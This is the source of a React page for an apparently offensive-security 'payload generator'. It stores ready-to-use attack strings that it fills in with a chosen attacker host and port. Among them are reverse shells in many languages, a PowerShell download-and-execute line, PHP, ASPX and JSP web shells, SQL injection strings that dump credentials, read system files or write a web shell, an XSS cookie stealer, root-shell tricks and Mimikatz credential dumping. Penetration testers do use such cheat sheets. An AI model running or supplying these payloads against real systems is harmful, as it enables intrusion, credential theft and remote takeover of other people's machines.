'use client'
import React, { useState, useMemo } from 'react'
import Link from 'next/link'

interface Payload {
  name: string
  category: string
  language: string
  template: string
  notes: string
  tags: string[]
}

const PAYLOADS: Payload[] = [
  // Reverse Shells
  {
    name: 'Bash TCP', category: 'reverse-shell', language: 'bash',
    template: 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1',
    notes: 'Most reliable bash reverse shell. Requires /dev/tcp support (most Linux systems).',
    tags: ['linux', 'bash', 'simple']
  },
  {
    name: 'Bash UDP', category: 'reverse-shell', language: 'bash',
    template: 'bash -i >& /dev/udp/LHOST/LPORT 0>&1',
    notes: 'UDP version — useful when TCP is filtered.',
    tags: ['linux', 'bash', 'udp']
  },
  {
    name: 'Python3 TCP', category: 'reverse-shell', language: 'python',
    template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    notes: 'Python3 reverse shell. Works anywhere Python3 is installed.',
    tags: ['linux', 'python3', 'cross-platform']
  },
  {
    name: 'Python2 TCP', category: 'reverse-shell', language: 'python',
    template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    notes: 'Python2 version — check with: python --version',
    tags: ['linux', 'python2']
  },
  {
    name: 'PHP exec', category: 'reverse-shell', language: 'php',
    template: `php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'`,
    notes: 'PHP reverse shell one-liner. Common when you have command injection in PHP app.',
    tags: ['php', 'web', 'linux']
  },
  {
    name: 'PHP proc_open', category: 'reverse-shell', language: 'php',
    template: `php -r '$sock=fsockopen("LHOST",LPORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`,
    notes: 'Alternative PHP shell using proc_open — more reliable on some systems.',
    tags: ['php', 'web', 'linux']
  },
  {
    name: 'Netcat (with -e)', category: 'reverse-shell', language: 'bash',
    template: 'nc -e /bin/sh LHOST LPORT',
    notes: 'Requires netcat with -e flag (traditional nc). Many modern systems ship openbsd-nc which lacks -e.',
    tags: ['linux', 'netcat', 'simple']
  },
  {
    name: 'Netcat (no -e)', category: 'reverse-shell', language: 'bash',
    template: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f',
    notes: 'Works with OpenBSD netcat (no -e flag). Uses named pipe trick.',
    tags: ['linux', 'netcat', 'universal']
  },
  {
    name: 'PowerShell Base64', category: 'reverse-shell', language: 'powershell',
    template: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    notes: 'Windows PowerShell reverse shell. Bypasses basic execution policy.',
    tags: ['windows', 'powershell', 'evasion']
  },
  {
    name: 'PowerShell (short)', category: 'reverse-shell', language: 'powershell',
    template: `IEX(New-Object Net.WebClient).downloadString('http://LHOST/Invoke-PowerShellTcp.ps1')`,
    notes: 'Download and execute Nishang PowerShell reverse shell. Requires hosting the script.',
    tags: ['windows', 'powershell', 'nishang']
  },
  {
    name: 'Perl', category: 'reverse-shell', language: 'perl',
    template: `perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    notes: 'Perl reverse shell — useful when Python/PHP unavailable but Perl is.',
    tags: ['linux', 'perl']
  },
  {
    name: 'Ruby', category: 'reverse-shell', language: 'ruby',
    template: `ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    notes: 'Ruby reverse shell.',
    tags: ['linux', 'ruby']
  },
  {
    name: 'Node.js', category: 'reverse-shell', language: 'javascript',
    template: `node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(LPORT,"LHOST",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()'`,
    notes: 'Node.js reverse shell — useful in Node.js injection vulnerabilities.',
    tags: ['linux', 'nodejs', 'javascript', 'web']
  },

  // Web Shells
  {
    name: 'PHP Webshell (minimal)', category: 'webshell', language: 'php',
    template: `<?php system($_GET["cmd"]); ?>`,
    notes: 'Minimal PHP webshell. Access: http://target/shell.php?cmd=id',
    tags: ['php', 'web', 'minimal']
  },
  {
    name: 'PHP Webshell (POST)', category: 'webshell', language: 'php',
    template: `<?php if(isset($_POST['cmd'])){system($_POST['cmd']);}?>`,
    notes: 'POST-based — less visible in server logs than GET.',
    tags: ['php', 'web', 'post']
  },
  {
    name: 'PHP Webshell (passthru)', category: 'webshell', language: 'php',
    template: `<?php passthru($_GET['cmd']); ?>`,
    notes: 'Uses passthru() — may bypass some filters that block system().',
    tags: ['php', 'web', 'bypass']
  },
  {
    name: 'ASPX Webshell', category: 'webshell', language: 'aspx',
    template: `<%@ Page Language="C#" %><% System.Diagnostics.Process proc = new System.Diagnostics.Process();proc.StartInfo.FileName = "cmd.exe";proc.StartInfo.Arguments = "/c " + Request["cmd"];proc.StartInfo.UseShellExecute = false;proc.StartInfo.RedirectStandardOutput = true;proc.Start();Response.Write(proc.StandardOutput.ReadToEnd()); %>`,
    notes: 'ASPX webshell for Windows IIS servers.',
    tags: ['aspx', 'windows', 'iis']
  },
  {
    name: 'JSP Webshell', category: 'webshell', language: 'jsp',
    template: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`,
    notes: 'Java Server Pages webshell — upload to Tomcat/JBoss.',
    tags: ['jsp', 'java', 'tomcat']
  },

  // SQL Injection
  {
    name: 'MySQL — Union detection', category: 'sqli', language: 'sql',
    template: `' ORDER BY N--+`,
    notes: 'Increment N until error — reveals column count. Then use UNION SELECT.',
    tags: ['mysql', 'union', 'detection']
  },
  {
    name: 'MySQL — Dump credentials', category: 'sqli', language: 'sql',
    template: `' UNION SELECT user,password,3,4 FROM mysql.user--+`,
    notes: 'Dump MySQL user credentials. Requires 4-column query.',
    tags: ['mysql', 'creds', 'dump']
  },
  {
    name: 'MySQL — Read file', category: 'sqli', language: 'sql',
    template: `' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4--+`,
    notes: 'Read server files via LOAD_FILE(). Requires FILE privilege.',
    tags: ['mysql', 'file-read', 'lfi']
  },
  {
    name: 'MySQL — Write webshell', category: 'sqli', language: 'sql',
    template: `' UNION SELECT "<?php system($_GET['cmd']); ?>",2,3,4 INTO OUTFILE '/var/www/html/shell.php'--+`,
    notes: 'Write a webshell to web root via SQL. Requires write permissions.',
    tags: ['mysql', 'webshell', 'rce']
  },
  {
    name: 'Time-based blind (MySQL)', category: 'sqli', language: 'sql',
    template: `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--+`,
    notes: '5-second delay confirms blind SQLi. Works when no output is visible.',
    tags: ['mysql', 'blind', 'time-based']
  },
  {
    name: 'Error-based (MySQL)', category: 'sqli', language: 'sql',
    template: `' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+`,
    notes: 'Extracts data via error message. No UNION needed.',
    tags: ['mysql', 'error-based', 'exfil']
  },
  {
    name: 'MSSQL — Time-based', category: 'sqli', language: 'sql',
    template: `'; WAITFOR DELAY '0:0:5'--`,
    notes: 'Microsoft SQL Server time-based blind injection.',
    tags: ['mssql', 'windows', 'blind']
  },
  {
    name: 'MSSQL — xp_cmdshell RCE', category: 'sqli', language: 'sql',
    template: `'; EXEC xp_cmdshell 'whoami';--`,
    notes: 'Execute OS commands via xp_cmdshell. Requires sysadmin role. Enable: EXEC sp_configure "show advanced options",1;RECONFIGURE;EXEC sp_configure "xp_cmdshell",1;RECONFIGURE',
    tags: ['mssql', 'rce', 'windows', 'high-priv']
  },

  // XSS
  {
    name: 'XSS Basic alert', category: 'xss', language: 'javascript',
    template: `<script>alert('XSS')</script>`,
    notes: 'Basic XSS PoC — if alert fires, script execution confirmed.',
    tags: ['xss', 'poc', 'basic']
  },
  {
    name: 'XSS Cookie stealer', category: 'xss', language: 'javascript',
    template: `<script>document.location='http://LHOST/steal?c='+document.cookie</script>`,
    notes: 'Exfiltrate session cookies to attacker server. Requires listener on LHOST.',
    tags: ['xss', 'session-hijack', 'cookie']
  },
  {
    name: 'XSS img onerror', category: 'xss', language: 'html',
    template: `<img src=x onerror=alert('XSS')>`,
    notes: 'Bypass script tag filters using img onerror attribute.',
    tags: ['xss', 'bypass', 'img']
  },
  {
    name: 'XSS SVG', category: 'xss', language: 'html',
    template: `<svg onload=alert('XSS')>`,
    notes: 'SVG-based XSS — works in contexts where script tags are stripped.',
    tags: ['xss', 'bypass', 'svg']
  },

  // Privilege Escalation
  {
    name: 'SUID vim', category: 'privesc', language: 'bash',
    template: `vim -c ':!/bin/bash'`,
    notes: 'If vim has SUID bit set — drops to root shell. Check: find / -perm -u=s -name vim 2>/dev/null',
    tags: ['linux', 'suid', 'vim']
  },
  {
    name: 'SUID nmap (old)', category: 'privesc', language: 'bash',
    template: `nmap --interactive\n!sh`,
    notes: 'nmap versions 2.02-5.21 have interactive mode. If SUID, !sh gives root.',
    tags: ['linux', 'suid', 'nmap']
  },
  {
    name: 'SUID python', category: 'privesc', language: 'python',
    template: `python -c 'import os; os.system("/bin/bash")'`,
    notes: 'Python with SUID bit — spawns root shell.',
    tags: ['linux', 'suid', 'python']
  },
  {
    name: 'Sudo awk', category: 'privesc', language: 'bash',
    template: `sudo awk 'BEGIN {system("/bin/bash")}'`,
    notes: 'If sudo permits awk with NOPASSWD — instant root shell.',
    tags: ['linux', 'sudo', 'awk']
  },
  {
    name: 'Sudo less', category: 'privesc', language: 'bash',
    template: `sudo less /etc/passwd\n!/bin/bash`,
    notes: 'Inside less: type !command to execute. If run as sudo, spawns root shell.',
    tags: ['linux', 'sudo', 'less']
  },
  {
    name: 'Cron wildcard injection', category: 'privesc', language: 'bash',
    template: `echo "chmod +s /bin/bash" > /tmp/shell.sh\necho "" > "/tmp/--checkpoint-action=exec=sh shell.sh"\necho "" > "/tmp/--checkpoint=1"`,
    notes: 'If root cron uses tar with wildcard * in /tmp — inject tar flags as filenames.',
    tags: ['linux', 'cron', 'wildcard', 'tar']
  },
  {
    name: 'PrintSpoofer (Windows)', category: 'privesc', language: 'cmd',
    template: `PrintSpoofer.exe -i -c cmd`,
    notes: 'Abuses SeImpersonatePrivilege for SYSTEM. Check first: whoami /priv | findstr Impersonate',
    tags: ['windows', 'token', 'impersonate', 'system']
  },
  {
    name: 'Mimikatz — dump creds', category: 'privesc', language: 'cmd',
    template: `mimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords`,
    notes: 'Dump plaintext passwords from LSASS memory. Requires SYSTEM or SeDebugPrivilege.',
    tags: ['windows', 'mimikatz', 'creds', 'lsass']
  },

  // Listeners
  {
    name: 'Netcat listener', category: 'listener', language: 'bash',
    template: `nc -lvnp LPORT`,
    notes: 'Basic catch-all listener. Start this BEFORE triggering reverse shell.',
    tags: ['listener', 'netcat', 'basic']
  },
  {
    name: 'Rlwrap nc listener', category: 'listener', language: 'bash',
    template: `rlwrap nc -lvnp LPORT`,
    notes: 'rlwrap gives arrow key history in the shell. Install: sudo apt install rlwrap',
    tags: ['listener', 'netcat', 'improved']
  },
  {
    name: 'Python3 PTY upgrade', category: 'listener', language: 'bash',
    template: `python3 -c 'import pty;pty.spawn("/bin/bash")'`,
    notes: 'Run on TARGET after getting shell — upgrades to fully interactive TTY. Then Ctrl+Z, stty raw -echo; fg, reset.',
    tags: ['listener', 'pty', 'upgrade', 'interactive']
  },
  {
    name: 'Socat listener', category: 'listener', language: 'bash',
    template: `socat file:\`tty\`,raw,echo=0 tcp-listen:LPORT`,
    notes: 'Socat fully interactive listener — better than nc. Requires socat on both ends.',
    tags: ['listener', 'socat', 'interactive']
  },
  {
    name: 'Metasploit multi/handler', category: 'listener', language: 'bash',
    template: `use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun`,
    notes: 'Catch Meterpreter payloads from msfvenom-generated executables.',
    tags: ['listener', 'metasploit', 'meterpreter']
  },
]

const CATEGORIES = ['all', 'reverse-shell', 'webshell', 'sqli', 'xss', 'privesc', 'listener']
const CAT_COLORS: Record<string, string> = {
  'reverse-shell': '#ff4136',
  webshell: '#ff6b35',
  sqli: '#ffb347',
  xss: '#00d4ff',
  privesc: '#bf5fff',
  listener: '#00ff41',
}
const CAT_LABELS: Record<string, string> = {
  'reverse-shell': 'Reverse Shell',
  webshell: 'Web Shell',
  sqli: 'SQL Injection',
  xss: 'Cross-Site Scripting',
  privesc: 'Privilege Escalation',
  listener: 'Listeners & Upgrade',
}

export default function PayloadPage() {
  const [lhost, setLhost] = useState('10.10.14.1')
  const [lport, setLport] = useState('4444')
  const [category, setCategory] = useState('all')
  const [search, setSearch] = useState('')
  const [copied, setCopied] = useState<string | null>(null)
  const [tagFilter, setTagFilter] = useState('')

  const apply = (template: string) =>
    template.replace(/LHOST/g, lhost || 'LHOST').replace(/LPORT/g, lport || 'LPORT')

  const copy = (text: string, id: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(id)
      setTimeout(() => setCopied(null), 2000)
    })
  }

  const filtered = useMemo(() => {
    return PAYLOADS.filter(p => {
      const matchCat = category === 'all' || p.category === category
      const q = search.toLowerCase()
      const matchSearch = !q || p.name.toLowerCase().includes(q) || p.template.toLowerCase().includes(q) || p.language.toLowerCase().includes(q) || p.tags.some(t => t.includes(q))
      const matchTag = !tagFilter || p.tags.includes(tagFilter)
      return matchCat && matchSearch && matchTag
    })
  }, [category, search, tagFilter])

  return (
    <div>
      <div style={{ marginBottom: '2rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>GHOSTNET // OFFENSIVE</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: '#bf5fff', margin: '0.5rem 0', textShadow: '0 0 20px rgba(191,95,255,0.3)' }}>PAYLOAD GENERATOR</h1>
        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem' }}>
          {PAYLOADS.length} payloads — reverse shells · web shells · SQLi · XSS · privesc · listeners
        </p>
      </div>

      {/* LHOST/LPORT config */}
      <div style={{ background: '#0a0010', border: '1px solid #1a002e', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.5rem', display: 'flex', gap: '16px', alignItems: 'center', flexWrap: 'wrap' as const }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.2em' }}>CONFIGURE:</div>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <label style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', color: '#5a5a8a', letterSpacing: '0.1em' }}>LHOST</label>
          <input value={lhost} onChange={e => setLhost(e.target.value)} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', background: '#080010', border: '1px solid #1a002e', borderRadius: '3px', padding: '5px 10px', color: '#bf5fff', outline: 'none', width: '140px' }} />
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <label style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', color: '#5a5a8a', letterSpacing: '0.1em' }}>LPORT</label>
          <input value={lport} onChange={e => setLport(e.target.value)} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', background: '#080010', border: '1px solid #1a002e', borderRadius: '3px', padding: '5px 10px', color: '#bf5fff', outline: 'none', width: '80px' }} />
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#3a3a5a' }}>
          → All payloads auto-updated with your values
        </div>
        <div style={{ marginLeft: 'auto', padding: '4px 12px', background: 'rgba(191,95,255,0.06)', border: '1px solid rgba(191,95,255,0.2)', borderRadius: '3px', fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', color: '#5a3a8a', letterSpacing: '0.1em' }}>
          FOR AUTHORISED TESTING ONLY
        </div>
      </div>

      {/* Search + filters */}
      <div style={{ display: 'flex', gap: '8px', marginBottom: '1rem', flexWrap: 'wrap' as const }}>
        <input
          value={search}
          onChange={e => setSearch(e.target.value)}
          placeholder="search payloads..."
          style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', background: '#0a0010', border: '1px solid #1a002e', borderRadius: '4px', padding: '7px 12px', color: '#bf5fff', outline: 'none', flex: 1, minWidth: '200px' }}
        />
        {CATEGORIES.map(cat => (
          <button key={cat} onClick={() => setCategory(cat)} style={{
            fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', letterSpacing: '0.1em',
            padding: '6px 12px', borderRadius: '3px', cursor: 'pointer',
            background: category === cat ? 'rgba(191,95,255,0.1)' : 'transparent',
            border: `1px solid ${category === cat ? 'rgba(191,95,255,0.4)' : '#1a002e'}`,
            color: category === cat ? '#bf5fff' : '#3a3a5a',
          }}>
            {cat === 'all' ? 'ALL' : (CAT_LABELS[cat] || cat).toUpperCase()}
          </button>
        ))}
      </div>

      {/* Tag filters */}
      <div style={{ display: 'flex', gap: '4px', marginBottom: '1.5rem', flexWrap: 'wrap' as const }}>
        {['linux', 'windows', 'php', 'python', 'powershell', 'bypass', 'blind', 'suid', 'sudo', 'listener'].map(tag => (
          <button key={tag} onClick={() => setTagFilter(tagFilter === tag ? '' : tag)} style={{
            fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', letterSpacing: '0.08em',
            padding: '3px 8px', borderRadius: '2px', cursor: 'pointer',
            background: tagFilter === tag ? 'rgba(191,95,255,0.1)' : 'transparent',
            border: `1px solid ${tagFilter === tag ? 'rgba(191,95,255,0.4)' : '#0e000e'}`,
            color: tagFilter === tag ? '#bf5fff' : '#2a2a4a',
          }}>#{tag}</button>
        ))}
        {tagFilter && <button onClick={() => setTagFilter('')} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', padding: '3px 8px', borderRadius: '2px', cursor: 'pointer', background: 'rgba(255,65,54,0.1)', border: '1px solid rgba(255,65,54,0.3)', color: '#ff4136' }}>× clear</button>}
      </div>

      {/* Payload cards */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '1px', background: '#1a002e', borderRadius: '6px', overflow: 'hidden', border: '1px solid #1a002e' }}>
        {filtered.length === 0 && (
          <div style={{ padding: '2rem', textAlign: 'center', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a3a5a', background: '#0a0010' }}>
            No payloads match filter
          </div>
        )}
        {filtered.map((payload, i) => {
          const catColor = CAT_COLORS[payload.category] || '#bf5fff'
          const applied = apply(payload.template)
          const id = `${i}-${payload.name}`
          return (
            <div key={i} style={{ background: '#0a0010', borderLeft: `3px solid ${catColor}` }}>
              {/* Header */}
              <div style={{ padding: '12px 16px', display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap' as const }}>
                <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', letterSpacing: '0.1em', padding: '2px 8px', borderRadius: '2px', background: `${catColor}18`, color: catColor }}>{CAT_LABELS[payload.category] || payload.category}</span>
                <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', fontWeight: 700, color: '#c8c8e8' }}>{payload.name}</span>
                <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', color: '#3a3a5a', padding: '2px 6px', border: '1px solid #1a002e', borderRadius: '2px' }}>{payload.language}</span>
                <div style={{ marginLeft: 'auto', display: 'flex', gap: '4px', flexWrap: 'wrap' as const }}>
                  {payload.tags.map(tag => (
                    <span key={tag} onClick={() => setTagFilter(tag)} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#2a2a4a', padding: '1px 5px', border: '1px solid #0e000e', borderRadius: '2px', cursor: 'pointer' }}>#{tag}</span>
                  ))}
                </div>
              </div>

              {/* Payload */}
              <div style={{ position: 'relative' as const, margin: '0 16px 8px' }}>
                <pre style={{ background: '#050008', border: '1px solid #1a002e', borderRadius: '4px', padding: '12px 40px 12px 14px', overflow: 'auto', color: catColor, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', lineHeight: 1.5, whiteSpace: 'pre-wrap' as const, wordBreak: 'break-all' as const, margin: 0 }}>
                  {applied}
                </pre>
                <button
                  onClick={() => copy(applied, id)}
                  style={{ position: 'absolute' as const, top: '8px', right: '8px', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', letterSpacing: '0.1em', padding: '3px 8px', borderRadius: '2px', cursor: 'pointer', background: copied === id ? 'rgba(0,255,65,0.2)' : 'rgba(191,95,255,0.1)', border: `1px solid ${copied === id ? 'rgba(0,255,65,0.5)' : 'rgba(191,95,255,0.3)'}`, color: copied === id ? '#00ff41' : '#bf5fff', transition: 'all 0.15s' }}
                >
                  {copied === id ? 'COPIED!' : 'COPY'}
                </button>
              </div>

              {/* Notes */}
              <div style={{ padding: '0 16px 12px', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.68rem', color: '#3a3a5a', lineHeight: 1.5 }}>
                {payload.notes}
              </div>
            </div>
          )
        })}
      </div>

      <div style={{ marginTop: '2rem', paddingTop: '1.5rem', borderTop: '1px solid #1a002e', display: 'flex', gap: '1rem' }}>
        <Link href="/terminal" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#00ff41', padding: '8px 20px', border: '1px solid rgba(0,255,65,0.3)', borderRadius: '4px', background: 'rgba(0,255,65,0.05)' }}>
          TERMINAL →
        </Link>
        <Link href="/tools" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#00d4ff', padding: '8px 20px', border: '1px solid rgba(0,212,255,0.3)', borderRadius: '4px', background: 'rgba(0,212,255,0.05)' }}>
          TOOL REFERENCE →
        </Link>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a', padding: '8px 20px', border: '1px solid #1a2e1e', borderRadius: '4px' }}>
          ← DASHBOARD
        </Link>
      </div>
    </div>
  )
}
